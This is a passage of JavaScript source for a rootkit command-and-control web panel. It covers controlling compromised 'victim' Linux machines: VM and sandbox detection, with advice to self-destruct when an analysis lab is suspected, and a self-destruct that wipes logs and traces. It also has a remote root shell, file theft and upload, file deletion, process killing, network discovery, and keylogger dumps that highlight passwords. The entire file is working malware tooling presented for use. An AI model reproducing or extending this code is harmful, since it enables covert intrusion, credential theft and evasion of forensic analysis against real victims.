    h+='<button class="btn btn-sm btn-primary" onclick="survWatchFiles()">'+I.search+' Check Now</button></div>';
    if(S.survFileData){
      h+='<div class="card" style="padding:0;overflow:hidden"><div style="max-height:500px;overflow-y:auto">';
      h+='<pre class="mono" style="margin:0;padding:12px;font-size:11px;line-height:1.6;color:var(--t2);white-space:pre-wrap;word-break:break-all">';
      S.survFileData.split('\\n').forEach(l=>{
        const isHeader=l.startsWith('===');
        const isAlert=l.match(/shadow|authorized_keys|sudoers/i);
        if(isHeader)h+='<span style="color:var(--cyan);font-weight:600">'+esc(l)+'</span>\\n';
        else if(isAlert)h+='<span style="color:var(--red)">'+esc(l)+'</span>\\n';
        else h+=esc(l)+'\\n';
      });
      h+='</pre></div></div>';
    }
  }else if(S.survTab==='authlogs'){
    h+='<div class="card" style="padding:14px;margin-bottom:16px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:8px">Authentication Logs</div>';
    h+='<div style="font-size:11px;color:var(--t3);margin-bottom:12px">SSH logins, sudo usage, authentication failures — monitor for brute-force or admin activity.</div>';
    h+='<button class="btn btn-sm btn-primary" onclick="survAuthLogs()">'+I.download+' Fetch Logs</button></div>';
    if(S.survAuthData){
      h+='<div class="card" style="padding:0;overflow:hidden"><div style="max-height:500px;overflow-y:auto">';
      h+='<pre class="mono" style="margin:0;padding:12px;font-size:11px;line-height:1.6;color:var(--t2);white-space:pre-wrap;word-break:break-all">';
      S.survAuthData.split('\\n').forEach(l=>{
        const isFail=l.match(/Failed|FAILED|invalid|error|denied/i);
        const isSuccess=l.match(/Accepted|session opened|sudo/i);
        if(isFail)h+='<span style="color:var(--red)">'+esc(l)+'</span>\\n';
        else if(isSuccess)h+='<span style="color:var(--green)">'+esc(l)+'</span>\\n';
        else h+=esc(l)+'\\n';
      });
      h+='</pre></div></div>';
    }
  }
  return h;
};

/* ===== VM / SANDBOX DETECTION ===== */
panels.recon=function(){
  let h='<div class="panel-hdr"><div><div class="panel-title">VM / Sandbox Detection</div><div class="panel-sub">Detect virtualization, containers, and security monitoring — MITRE T1497</div></div><div class="panel-actions"><button class="btn btn-sm btn-primary" onclick="runVMDetect()" '+(S.vmRunning?'disabled':'')+'>'+I.scan+(S.vmRunning?' Scanning...':' Run Detection')+'</button></div></div>';
  if(!S.vmChecked)h+='<div class="card" style="text-align:center;padding:40px;color:var(--t3)">Click <b>Run Detection</b> to analyze the victim environment.<br><span style="font-size:11px;color:var(--t4);margin-top:8px;display:block">Checks: CPUID hypervisor flag, DMI/BIOS strings, VM kernel modules, MAC OUI, disk models, guest tools, containers, security tools</span></div>';
  else if(S.vmInfo){
    const det=S.vmInfo.filter(v=>v.detected).length;const clean=S.vmInfo.filter(v=>!v.detected).length;
    const isVM=det>=2;
    h+='<div class="card" style="padding:16px;margin-bottom:16px;border-left:4px solid '+(isVM?'var(--yellow)':'var(--green)');
    h+=';display:flex;align-items:center;gap:16px">';
    h+='<div style="width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;background:'+(isVM?'color-mix(in srgb,var(--yellow) 15%,transparent)':'color-mix(in srgb,var(--green) 15%,transparent)')+'">'+(isVM?'⚠':'✓')+'</div>';
    h+='<div><div style="font-size:18px;font-weight:700;color:'+(isVM?'var(--yellow)':'var(--green)')+'">'+( isVM?'Virtual Environment Detected':'Bare Metal / Clean Environment')+'</div>';
    h+='<div style="font-size:12px;color:var(--t3);margin-top:4px">'+det+' indicator'+(det>1?'s':'')+' detected, '+clean+' clean — '+(isVM?'Target is running in a virtualized environment':'No strong virtualization indicators found')+'</div>';
    const vmType=S.vmInfo.find(v=>v.name.includes('DMI')&&v.detected);
    if(vmType)h+='<div style="margin-top:6px"><span class="badge b-info" style="padding:3px 10px;font-size:10px">Platform: '+esc(vmType.output.split('\\n')[0])+'</span></div>';
    h+='</div></div>';
    h+='<div class="grid g3" style="margin-bottom:16px">';
    h+='<div class="card" style="padding:10px 14px;text-align:center"><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Checks Run</div><div style="font-size:22px;font-weight:700;color:var(--cyan)">'+S.vmInfo.length+'</div></div>';
    h+='<div class="card" style="padding:10px 14px;text-align:center"><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Indicators Found</div><div style="font-size:22px;font-weight:700;color:var(--yellow)">'+det+'</div></div>';
    h+='<div class="card" style="padding:10px 14px;text-align:center"><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Clean</div><div style="font-size:22px;font-weight:700;color:var(--green)">'+clean+'</div></div>';
    h+='</div>';
    h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">';
    S.vmInfo.forEach(c=>{
      const d=c.detected;
      h+='<div class="card" style="padding:12px;border-left:3px solid '+(d?'var(--yellow)':'var(--green)')+'">';
      h+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px"><span class="badge '+(d?'b-warn':'b-pass')+'" style="font-size:9px">'+(d?'DETECTED':'CLEAN')+'</span><span style="font-weight:600;font-size:12px;color:var(--t1)">'+esc(c.name)+'</span></div>';
      h+='<div style="font-size:11px;color:var(--t3);margin-bottom:6px">'+esc(c.desc)+'</div>';
      h+='<div class="mono" style="font-size:10px;color:'+(d?'var(--yellow)':'var(--t4)')+';background:var(--bg-0);padding:6px 8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:80px;overflow-y:auto">'+esc(c.output||'(no output)')+'</div>';
      h+='</div>';
    });
    h+='</div>';
    if(isVM){
      h+='<div class="card" style="padding:12px;margin-top:16px;border-left:3px solid var(--red)"><div style="font-size:12px;font-weight:600;color:var(--red);margin-bottom:4px">OPSEC Recommendation</div>';
      h+='<div style="font-size:11px;color:var(--t3);line-height:1.6">Virtual environment detected. This could be:<br>';
      h+='• A <b>production VM</b> — proceed normally<br>';
      h+='• A <b>honeypot/sandbox</b> — consider self-destruct to avoid analysis<br>';
      h+='• A <b>malware analysis lab</b> — rootkit behavior may be recorded</div></div>';
    }
  }
  return h;
};

/* (Auto-Harvest merged into Credentials panel as "Deep Harvest" tab) */

/* ===== SELF-DESTRUCT ===== */
panels.selfdestruct=function(){
  let h='<div class="panel-hdr"><div><div class="panel-title" style="color:var(--red)">Self-Destruct</div><div class="panel-sub">Remove all rootkit traces from victim</div></div></div>';
  h+='<div class="card" style="border:2px solid var(--red);text-align:center;padding:30px">';
  h+='<div style="font-size:48px;margin-bottom:16px">'+(S.selfDestructDone?'☠':'⚠️')+'</div>';
  if(S.selfDestructDone){
    h+='<div style="font-size:16px;font-weight:600;color:var(--red);margin-bottom:8px">Self-Destruct Executed</div>';
    h+='<div style="font-size:12px;color:var(--t3)">All rootkit artifacts have been removed from victim.</div>';
  } else if(S.selfDestructArmed){
    h+='<div style="font-size:16px;font-weight:600;color:var(--red);margin-bottom:8px">ARMED — Click again to confirm</div>';
    h+='<div style="font-size:12px;color:var(--t3);margin-bottom:16px">This will: remove kernel module, delete persistence, wipe logs, shred temp files, remove rootkit binary.</div>';
    h+='<button class="btn btn-danger" style="padding:12px 32px;font-size:14px" onclick="selfDestruct()">'+I.skull+' CONFIRM SELF-DESTRUCT</button>';
    h+=' <button class="btn" style="padding:12px 32px;font-size:14px;margin-left:12px" onclick="S.selfDestructArmed=false;renderPanel()">Cancel</button>';
  } else {
    h+='<div style="font-size:16px;font-weight:600;color:var(--t1);margin-bottom:8px">Emergency Self-Destruct</div>';
    h+='<div style="font-size:12px;color:var(--t3);margin-bottom:16px">Completely remove the rootkit and all traces from the victim machine. This action is irreversible.</div>';
    h+='<button class="btn btn-danger" style="padding:12px 32px;font-size:14px" onclick="S.selfDestructArmed=true;renderPanel()">'+I.zap+' ARM Self-Destruct</button>';
  }
  h+='</div>';
  return h;
};

panels.settings=function(){
  const ic=s=>'<span style="display:inline-flex;width:16px;height:16px;vertical-align:middle;margin-right:6px">'+s+'</span>';
  let h='<div class="panel-hdr"><div><div class="panel-title">Settings</div><div class="panel-sub">Server administration &amp; configuration</div></div></div>';

  h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">';

  h+='<div class="card"><div style="font-size:13px;font-weight:600;color:var(--t1);margin-bottom:4px">'+ic(I.gear)+'Server Control</div>';
  h+='<div style="font-size:11px;color:var(--t3);margin-bottom:16px">Manage C2 server and rootkit connection</div>';
  h+='<div style="display:flex;flex-direction:column;gap:8px">';
  h+='<button class="btn btn-sm" onclick="settingsReconnectRk()" style="justify-content:center"><span style="display:inline-flex;width:14px;height:14px">'+I.refresh+'</span> Reconnect Rootkit</button>';
  h+='<button class="btn btn-sm btn-danger" onclick="settingsRestartC2()" style="justify-content:center"><span style="display:inline-flex;width:14px;height:14px">'+I.zap+'</span> Restart C2 Server</button>';
  h+='</div>';
  h+='<div id="sctl-msg" style="font-size:11px;margin-top:8px;min-height:16px"></div>';
  h+='</div>';

  h+='<div class="card"><div style="font-size:13px;font-weight:600;color:var(--t1);margin-bottom:4px">'+ic(I.key)+'Change Platform Password</div>';
  h+='<div style="font-size:11px;color:var(--t3);margin-bottom:16px">Update the web interface login password</div>';
  h+='<input id="s-cur-pw" type="password" class="input" placeholder="Current password" style="margin-bottom:8px;font-size:12px">';
  h+='<input id="s-new-pw" type="password" class="input" placeholder="New password" style="margin-bottom:8px;font-size:12px">';
  h+='<input id="s-cfm-pw" type="password" class="input" placeholder="Confirm new password" style="margin-bottom:12px;font-size:12px">';
  h+='<button class="btn btn-sm btn-success" onclick="settingsChangePw()" style="width:100%;justify-content:center">Update Password</button>';
  h+='<div id="spw-msg" style="font-size:11px;margin-top:8px;min-height:16px"></div>';
  h+='</div>';

  h+='</div>';

  h+='<div class="card" style="margin-top:16px"><div style="font-size:13px;font-weight:600;color:var(--t1);margin-bottom:4px">'+ic(I.shield)+'Session Info</div>';
  h+='<div style="font-size:11px;color:var(--t3);margin-bottom:12px">Current authentication and connection status</div>';
  h+='<table style="width:100%;font-size:12px">';
  h+='<tr><td style="color:var(--t3);padding:6px 0">Platform Auth</td><td style="padding:6px 0;text-align:right;color:var(--green)">Active</td></tr>';
  h+='<tr><td style="color:var(--t3);padding:6px 0">Rootkit Auth</td><td style="padding:6px 0;text-align:right;color:'+(S.rkAuth?'var(--green)':'var(--yellow)')+'">'+( S.rkAuth?'Authenticated':'Pending')+'</td></tr>';
  h+='<tr><td style="color:var(--t3);padding:6px 0">Rootkit Connection</td><td style="padding:6px 0;text-align:right;color:'+(S.rkUp?'var(--green)':'var(--red)')+'">'+( S.rkUp?'Connected':'Disconnected')+'</td></tr>';
  h+='<tr><td style="color:var(--t3);padding:6px 0">Encryption</td><td style="padding:6px 0;text-align:right;color:var(--t1)">ChaCha20-Poly1305</td></tr>';
  h+='<tr><td style="color:var(--t3);padding:6px 0">Session TTL</td><td style="padding:6px 0;text-align:right;color:var(--t1)">1h (renews on activity)</td></tr>';
  h+='<tr><td style="color:var(--t3);padding:6px 0">WebSocket</td><td style="padding:6px 0;text-align:right;color:'+(S.wsUp?'var(--green)':'var(--red)')+'">'+( S.wsUp?'Connected':'Disconnected')+'</td></tr>';
  h+='<tr><td style="color:var(--t3);padding:6px 0">Uptime</td><td style="padding:6px 0;text-align:right;color:var(--t1)">'+fmtUp(S.uptime)+'</td></tr>';
  h+='</table></div>';

  h+='<div class="card" style="margin-top:16px;border:1px solid var(--border-l);padding:12px 16px"><div style="font-size:11px;color:var(--t4);display:flex;align-items:center;gap:8px">'+ic(I.lock)+'<span><strong>Rootkit password</strong> is hardcoded in the kernel module and cannot be changed from the UI. Recompile the module to change it.</span></div></div>';

  return h;
};

async function settingsReconnectRk(){
  const msg=document.getElementById('sctl-msg');
  if(msg)msg.innerHTML='<span style="color:var(--yellow)">Disconnecting rootkit...</span>';
  try{
    const r=await fetch('/api/reconnect-rk',{method:'POST',headers:{'X-Token':S.token}});
    const d=await r.json();
    if(d.ok){if(msg)msg.innerHTML='<span style="color:var(--green)">'+d.message+'</span>';toast('Rootkit reconnecting...','info')}
    else{if(msg)msg.innerHTML='<span style="color:var(--red)">'+d.error+'</span>'}
  }catch(e){if(msg)msg.innerHTML='<span style="color:var(--red)">Connection error</span>'}
}

async function settingsRestartC2(){
  if(!confirm('Restart the C2 server? You will need to refresh the page.'))return;
  const msg=document.getElementById('sctl-msg');
  if(msg)msg.innerHTML='<span style="color:var(--yellow)">Restarting server...</span>';
  try{
    await fetch('/api/restart-c2',{method:'POST',headers:{'X-Token':S.token}});
    toast('Server restarting — refresh page in a few seconds','warn');
  }catch(e){}
}

async function settingsChangePw(){
  const msg=document.getElementById('spw-msg');
  const cur=document.getElementById('s-cur-pw').value;
  const np=document.getElementById('s-new-pw').value;
  const cfm=document.getElementById('s-cfm-pw').value;
  if(!cur||!np){if(msg)msg.innerHTML='<span style="color:var(--red)">Fill all fields</span>';return}
  if(np!==cfm){if(msg)msg.innerHTML='<span style="color:var(--red)">Passwords don\'t match</span>';return}
  try{
    const r=await fetch('/api/change-password',{method:'POST',headers:{'Content-Type':'application/json','X-Token':S.token},body:JSON.stringify({current:cur,new:np})});
    const d=await r.json();
    if(d.ok){if(msg)msg.innerHTML='<span style="color:var(--green)">Password changed successfully</span>';document.getElementById('s-cur-pw').value='';document.getElementById('s-new-pw').value='';document.getElementById('s-cfm-pw').value='';toast('Platform password updated','info')}
    else{if(msg)msg.innerHTML='<span style="color:var(--red)">'+(d.error||'Error')+'</span>'}
  }catch(e){if(msg)msg.innerHTML='<span style="color:var(--red)">Connection error</span>'}
}


/* ===== HELPER FUNCTIONS ===== */

// Terminal
// Terminal state
let termEnv={};
let termAliases={ll:'ls -la',la:'ls -la',l:'ls -CF',cls:'clear',ipconfig:'ip addr',ifconfig:'ip addr show',grep:'grep --color=never',egrep:'egrep --color=never'};
let termPrevCwd='/';
let termBusy=false;
function stripAnsi(s){return s.replace(/\x1b\[[0-9;]*[A-Za-z]/g,'').replace(/\x1b\][^\x07]*\x07/g,'')}
function termPrompt(){const hn=SYSTEM.hostname!=='--'?SYSTEM.hostname:'victim';return 'root@'+hn+':'+S.cwd+'# '}
function buildEnvPrefix(){let p='';Object.keys(termEnv).forEach(k=>{p+='export '+k+'='+termEnv[k]+'; '});return p}

async function termExec(cmd){
  if(!cmd)return;
  if(S.rkLocked){
    S.termLines.push({type:'error',text:'[-] Rootkit auth locked. Wait for lockout to expire.'});
    renderPanel();return;
  }
  if(!S.rkAuth){
    wsSend('auth',cmd);
    renderPanel();return;
  }
  // Expand aliases
  const firstWord=cmd.split(/\s+/)[0];
  if(termAliases[firstWord])cmd=cmd.replace(firstWord,termAliases[firstWord]);

  // Local builtins
  if(cmd==='clear'){S.termLines=[];renderPanel();return}
  if(cmd==='pwd'){S.termLines.push({type:'cmd',text:termPrompt()+cmd});S.termLines.push({type:'out',text:S.cwd});renderPanel();return}
  if(cmd==='history'){
    S.termLines.push({type:'cmd',text:termPrompt()+cmd});
    S.termHist.forEach((c,i)=>S.termLines.push({type:'out',text:'  '+(i+1)+'  '+c}));
    renderPanel();return;
  }
  if(cmd==='env'||cmd==='printenv'){
    S.termLines.push({type:'cmd',text:termPrompt()+cmd});
    if(Object.keys(termEnv).length===0){S.termLines.push({type:'out',text:'(no tracked exports — run export VAR=value to track)'})}
    else{Object.entries(termEnv).forEach(([k,v])=>S.termLines.push({type:'out',text:k+'='+v}))}
    renderPanel();return;
  }
  if(cmd.startsWith('export ')&&cmd.includes('=')){
    S.termLines.push({type:'cmd',text:termPrompt()+cmd});
    const parts=cmd.slice(7).split('=');const vn=parts[0].trim();const vv=parts.slice(1).join('=').trim().replace(/^["']|["']$/g,'');
    if(vn){termEnv[vn]=vv;S.termLines.push({type:'info',text:vn+'='+vv})}
    S.termHist.push(cmd);S.termHistI=-1;renderPanel();return;
  }
  if(cmd.startsWith('unset ')){
    S.termLines.push({type:'cmd',text:termPrompt()+cmd});
    const vn=cmd.slice(6).trim();delete termEnv[vn];
    S.termLines.push({type:'info',text:'unset '+vn});
    S.termHist.push(cmd);S.termHistI=-1;renderPanel();return;
  }
  if(cmd.startsWith('alias ')&&cmd.includes('=')){
    S.termLines.push({type:'cmd',text:termPrompt()+cmd});
    const m=cmd.match(/^alias\s+(\w+)=['"]?(.+?)['"]?$/);
    if(m){termAliases[m[1]]=m[2];S.termLines.push({type:'info',text:'alias '+m[1]+"='"+m[2]+"'"})}
    S.termHist.push(cmd);S.termHistI=-1;renderPanel();return;
  }
  if(cmd==='alias'){
    S.termLines.push({type:'cmd',text:termPrompt()+cmd});
    if(Object.keys(termAliases).length===0){S.termLines.push({type:'out',text:'(no aliases defined)'})}
    else{Object.entries(termAliases).forEach(([k,v])=>S.termLines.push({type:'out',text:"alias "+k+"='"+v+"'"}))}
    renderPanel();return;
  }
  if(cmd.startsWith('unalias ')){
    S.termLines.push({type:'cmd',text:termPrompt()+cmd});
    delete termAliases[cmd.slice(8).trim()];
    S.termHist.push(cmd);S.termHistI=-1;renderPanel();return;
  }
  if(cmd==='help'){
    S.termLines.push({type:'cmd',text:termPrompt()+cmd});
    ['Shell commands execute on victim via encrypted C2 channel.','','Builtins (local):','  cd <dir>       Change directory (cd -, cd ~ supported)','  pwd            Print working directory','  clear / Ctrl+L Clear terminal','  history        Show command history','  export K=V     Set environment variable (persists)','  unset K        Remove environment variable','  env / printenv Show tracked environment','  alias k=v      Create alias','  unalias k      Remove alias','  help           Show this help','','Shortcuts:','  Tab            Path auto-completion','  Up/Down        Command history','  Ctrl+C         Cancel / clear line','  Ctrl+U         Clear line','  Ctrl+A/E       Cursor to start/end','  !!             Repeat last command','  !n             Repeat command #n from history'].forEach(l=>S.termLines.push({type:'info',text:l}));
    renderPanel();return;
  }
  // History expansion
  if(cmd==='!!'&&S.termHist.length>0){cmd=S.termHist[S.termHist.length-1]}
  if(cmd.match(/^!\d+$/)){const n=parseInt(cmd.slice(1))-1;if(S.termHist[n])cmd=S.termHist[n]}
  // cd - (previous directory)
  if(cmd==='cd -'){cmd='cd '+termPrevCwd}
  if(cmd==='cd ~'||cmd==='cd'){cmd='cd /root'}

  S.termLines.push({type:'cmd',text:termPrompt()+cmd});
  S.termHist.push(cmd);S.termHistI=-1;
  addEv('cmd','$ '+cmd);
  termBusy=true;
  renderPanel();

  const envPfx=buildEnvPrefix();
  const realCmd=envPfx?envPfx+cmd:cmd;

  const prevCwd=S.cwd;
  const t0=Date.now();
  const out=await apiExec(realCmd);
  const dt=Date.now()-t0;
  termBusy=false;
  if(cmd.startsWith('cd ')&&S.cwd!==prevCwd){termPrevCwd=prevCwd;S.fsCwd=S.cwd}

  if(out!==null&&out!==undefined&&out!==''){
    const clean=stripAnsi(out);
    const lines=clean.split('\n');
    if(clean.length>=60000){S.termLines.push({type:'warn',text:'[!] Output truncated (max 60KB). Use head/tail/grep to filter.'})}
    lines.forEach(line=>{
      let type='out';
      if(line.match(/^-?(bash|sh):\s|[Ee]rror:|ERR:|[Pp]ermission denied|not found|No such/i))type='error';
      else if(line.match(/KEYLOG|HIDDEN|wlkom/i))type='rootkit';
      S.termLines.push({type,text:line});
    });
  } else if(cmd.startsWith('cd ')||cmd==='cd'){
    S.termLines.push({type:'info',text:S.cwd});
  }
  if(dt>2000)S.termLines.push({type:'info',text:'('+((dt/1000).toFixed(1))+'s)'});
  if(S.termLines.length>500)S.termLines=S.termLines.slice(-400);
  renderPanel();
  const tb=document.getElementById('tbody');if(tb)tb.scrollTop=tb.scrollHeight;
}

async function termTabComplete(input){
  if(!S.rkAuth)return null;
  const parts=input.split(/\s+/);
  const last=parts[parts.length-1]||'';
  const dir=last.includes('/')?last.substring(0,last.lastIndexOf('/')+1):(S.cwd==='/'?'/':S.cwd+'/');
  const partial=last.includes('/')?last.substring(last.lastIndexOf('/')+1):last;
  const cmd=parts.length<=1&&!last.includes('/')?
    'compgen -c '+last+' 2>/dev/null | head -20':
    'ls -1 '+dir+' 2>/dev/null | grep "^'+partial.replace(/[.*+?^${}()|[\]\\]/g,'\\\\$&')+'"';
  const out=await apiExec(cmd);
  if(!out||out.startsWith('Error'))return null;
  const matches=out.split('\n').filter(l=>l.trim());
  if(matches.length===0)return null;
  if(matches.length===1){
    parts[parts.length-1]=last.includes('/')?dir+matches[0]:matches[0];
    return parts.join(' ');
  }
  return {matches,prefix:last};
}

// Filesystem helpers
async function fsNav(path){
  if(S.fsCwd!==path)S.fsHistory.push(S.fsCwd);
  if(S.fsHistory.length>50)S.fsHistory=S.fsHistory.slice(-30);
  S.fsCwd=path;S.fsView=null;
  if(!S.fsTree[path]){
    S.fsLoading=true;renderPanel();
    await fsLoadDir(path);
    S.fsExpanded.add(path);
    S.fsLoading=false;
  } else {
    S.fsExpanded.add(path);
  }
  renderPanel();
}
function fsBack(){
  if(S.fsHistory.length<1)return;
  const prev=S.fsHistory.pop();
  S.fsCwd=prev;S.fsView=null;
  if(!S.fsTree[prev]){S.fsLoading=true;renderPanel();fsLoadDir(prev).then(()=>{S.fsLoading=false;S.fsExpanded.add(prev);renderPanel()})}
  else renderPanel();
}
function fsUp(){
  if(S.fsCwd==='/')return;
  const parent=S.fsCwd.split('/').slice(0,-1).join('/')||'/';
  fsNav(parent);
}
async function fsGoInput(){
  const el=document.getElementById('fspath');
  if(el&&el.value.trim()){const p=el.value.trim();fsNav(p)}
}
async function fsRefresh(){
  S.fsTree={};S.fsLoading=true;renderPanel();
  await fsLoadDir(S.fsCwd);
  S.fsExpanded.add(S.fsCwd);
  let p=S.fsCwd;
  while(p!=='/'){p=p.split('/').slice(0,-1).join('/')||'/';if(!S.fsTree[p])await fsLoadDir(p);S.fsExpanded.add(p)}
  S.fsLoading=false;renderPanel();
  toast('Filesystem refreshed','info');
}
async function fsToggle(path){
  if(S.fsExpanded.has(path)){S.fsExpanded.delete(path)}
  else{
    S.fsExpanded.add(path);
    if(!S.fsTree[path])await fsLoadDir(path);
  }
  renderPanel();
}
async function fsViewFile(path){
  toast('Loading file preview...','info');
  const out=await apiExec('cat '+path+' 2>/dev/null | head -200');
  S.fsView={name:path.split('/').pop(),path:path,content:out||'(empty or binary file)'};
  renderPanel();
}
async function fsDlDir(path){
  const dname=path==='/'?'root':path.split('/').filter(Boolean).pop();
  const archive='/tmp/_wlkom_'+dname+'.tar.gz';
  toast('Archiving '+path+' ...','info');
  addEv('cmd','Archive folder: '+path);
  const r1=await apiExec('tar czf '+archive+' -C '+path+' . 2>&1');
  if(r1&&r1.includes('Error')){toast('Archive failed: '+r1,'error');return}
  toast('Archive created, downloading...','info');
  try{
    const out=await apiExec('DOWNLOAD:'+archive);
    if(out&&out.startsWith('ERR:')){toast('Download error: '+out,'error');return}
    if(out&&out.startsWith('FILE_SAVED:')){
      toast('Downloaded: '+dname+'.tar.gz','info');
      const a=document.createElement('a');a.href='/api/dl/'+encodeURIComponent('_wlkom_'+dname+'.tar.gz');a.download=dname+'.tar.gz';a.click();
    } else {
      setTimeout(()=>checkAndSaveDl(archive,0),1500);
    }
  }catch(e){toast('Download error','error')}
  apiExec('rm -f '+archive);
  if(S.panel==='filesystem')renderPanel();
}
async function fsDl(path){
  addEv('cmd','Download: '+path);
  const fname=path.split('/').pop();
  toast('Downloading '+fname+' ...','info');
  try{
    const out=await apiExec('DOWNLOAD:'+path);
    if(out&&out.startsWith('ERR:')){toast('Download error: '+out,'error');return}
    if(out&&out.startsWith('FILE_SAVED:')){
      toast('Downloaded: '+fname,'info');
      const a=document.createElement('a');a.href='/api/dl/'+encodeURIComponent(fname);a.download=fname;a.click();
      if(S.panel==='filesystem')renderPanel();
      return;
    }
    setTimeout(()=>checkAndSaveDl(path,0),1000);
  }catch(e){toast('Download error','error')}
}
async function checkAndSaveDl(path,attempt){
  try{
    const r=await fetch('/api/downloads');const files=await r.json();
    const fname=path.split('/').pop();
    const match=files.find(f=>f.file===fname||f.path===path);
    if(match){
      toast('Downloaded: '+fname+' ('+match.size+'B)','info');
      const a=document.createElement('a');a.href='/api/dl/'+encodeURIComponent(match.file);a.download=fname;a.click();
      if(S.panel==='filesystem')renderPanel();
    } else if(attempt<10){
      setTimeout(()=>checkAndSaveDl(path,attempt+1),1500);
    } else {
      toast('Download timeout','error');
    }
  }catch(e){if(attempt<10)setTimeout(()=>checkAndSaveDl(path,attempt+1),2000)}
}
let _uploadFile=null;
function fsUploadFlow(){
  const inp=document.createElement('input');inp.type='file';
  inp.onchange=()=>{
    const file=inp.files[0];if(!file)return;
    _uploadFile=file;
    showUploadModal(file.name);
  };
  inp.click();
}
function showUploadModal(fname){
  const el=document.getElementById('cmdp');if(!el)return;
  let h='<div class="cmd-overlay" onclick="closeUploadModal()">';
  h+='<div class="cmd-palette" onclick="event.stopPropagation()" style="width:500px">';
  h+='<div style="padding:16px;border-bottom:1px solid var(--border)"><div style="font-size:16px;font-weight:600;color:var(--t1);margin-bottom:4px">Upload File to Victim</div>';
  h+='<div style="font-size:12px;color:var(--t3)">File: <span style="color:var(--cyan);font-family:var(--font-mono)">'+esc(fname)+'</span></div></div>';
  h+='<div style="padding:16px"><div style="font-size:12px;color:var(--t3);margin-bottom:8px">Destination path on victim:</div>';
  h+='<input class="input" id="uploadDest" value="'+esc(S.fsCwd+(S.fsCwd==='/'?'':'/')+fname)+'" style="width:100%;font-family:var(--font-mono);font-size:13px;margin-bottom:16px">';
  h+='<div style="display:flex;gap:8px;justify-content:flex-end">';
  h+='<button class="btn" onclick="closeUploadModal()">Cancel</button>';
  h+='<button class="btn btn-primary" onclick="doUpload()">'+I.upload+' Upload</button>';
  h+='</div></div></div></div>';
  el.innerHTML=h;
  const di=document.getElementById('uploadDest');if(di)di.focus();
}
function closeUploadModal(){const el=document.getElementById('cmdp');if(el)el.innerHTML='';_uploadFile=null}
async function doUpload(){
  const di=document.getElementById('uploadDest');
  if(!di||!_uploadFile)return;
  const rpath=di.value.trim();if(!rpath){toast('Enter a destination path','error');return}
  const file=_uploadFile;
  const btn=document.querySelector('#cmdp .btn-primary');
  if(btn){btn.disabled=true;btn.textContent='Uploading...'}
  const reader=new FileReader();
  reader.onload=async()=>{
    const arr=new Uint8Array(reader.result);
    let bin='';for(let i=0;i<arr.length;i++)bin+=String.fromCharCode(arr[i]);
    const b64=btoa(bin);
    try{
      const r=await fetch('/api/upload',{method:'POST',headers:{'Content-Type':'application/json','X-Token':S.token},body:JSON.stringify({remote_path:rpath,file_data:b64})});
      const d=await r.json();
      if(d.error){toast('Upload failed: '+d.error,'error');if(btn){btn.disabled=false;btn.textContent='Upload'}return}
      toast('Uploaded '+file.name+' to '+rpath+' ('+d.size+'B)','info');
      addEv('cmd','Upload: '+file.name+' -> '+rpath+' ('+d.size+'B)');
      closeUploadModal();
      const dir=rpath.substring(0,rpath.lastIndexOf('/'))||'/';
      delete S.fsTree[dir];
      await fsLoadDir(dir);
      if(S.fsCwd===dir)renderPanel();
    }catch(e){toast('Upload error: '+e.message,'error');if(btn){btn.disabled=false;btn.textContent='Upload'}}
  };
  reader.readAsArrayBuffer(file);
}

// File deletion
async function fsDeleteFile(path,isDir){
  const fname=path.split('/').pop();
  if(!confirm('Delete '+(isDir?'directory':'file')+' "'+fname+'" permanently?\\n\\nPath: '+path+'\\n\\nThis action cannot be undone.')) return;
  const dir=path.substring(0,path.lastIndexOf('/'))||'/';
  toast('Deleting '+fname+'...','warn');
  addEv('rootkit','Delete '+(isDir?'dir':'file')+': '+path);
  const cmd=isDir?'rm -rf "'+path+'" 2>&1 && echo DELETE_OK':'rm -f "'+path+'" 2>&1 && echo DELETE_OK';
  const out=await apiExec(cmd);
  if(out&&out.includes('DELETE_OK')){
    toast(fname+' deleted permanently','info');
    delete S.fsTree[dir];
    await fsLoadDir(dir);
  } else {
    toast('Delete failed: '+(out||'unknown error'),'error');
  }
  renderPanel();
}

// Processes
function killProc(pid){
  addEv('cmd','kill -9 '+pid);
  apiExec('kill -9 '+pid).then(()=>{toast('Sent SIGKILL to PID '+pid,'warn');renderPanel()});
}
function sendSignal(pid,sig){
  addEv('cmd','kill -'+sig+' '+pid);
  apiExec('kill -'+sig+' '+pid).then(()=>{toast('Sent SIG'+sig+' to PID '+pid,'warn');refreshProcesses().then(()=>renderPanel())});
}

// Topology scan
function topoScan(){
  S.topoScan=true;renderPanel();
  addEv('cmd','ARP scan 192.168.122.0/24');
  apiExec('arp -a 2>/dev/null || ip neigh show').then(out=>{
    S.topoScan=false;
    if(out){
      const lines=out.split('\n').filter(l=>l.trim());
      lines.forEach(l=>{
        const m=l.match(/(\d+\.\d+\.\d+\.\d+)/);
        if(m&&!S.topoHosts.find(h=>h.ip===m[1])){
          S.topoHosts.push({ip:m[1],hostname:'unknown',type:'host',os:'Unknown',ports:[],status:'up'});
        }
      });
    }
    toast('Scan complete: '+S.topoHosts.length+' hosts','info');
    renderPanel();
  });
}

// Keylogger
function klAction(action){
  const cmds={start:'KEYLOG_START',stop:'KEYLOG_STOP',dump:'KEYLOG_DUMP',status:'KEYLOG_STATUS'};
  const cmd=cmds[action];if(!cmd)return;
  addEv('rootkit',cmd);
  apiExec(cmd).then(out=>{
    if(action==='start'){S.klActive=true;toast('Keylogger started','success')}
    else if(action==='stop'){S.klActive=false;toast('Keylogger stopped','warning')}
    else if(action==='status'){
      if(out&&(out.includes('ON')||out.includes('ACTIVE')))S.klActive=true;
      else S.klActive=false;
    }
    else if(action==='dump'&&out){
      if(out.trim()==='(empty)'){toast('Buffer empty','info');renderPanel();return}
      const raw=out;const dumpTime=ts();
      const lines=raw.split('\n').filter(l=>l.length>0);
      const entry={time:dumpTime,raw:raw,lines:lines,bytes:raw.length};
      S.klDumps.push(entry);
      lines.forEach(l=>{
        const isPw=l.match(/pass|secret|key|token|pw|login|sudo|su\s/i);
        const isSudo=l.match(/^sudo\s|^su\s|^ssh\s|^mysql\s.*-p/i);
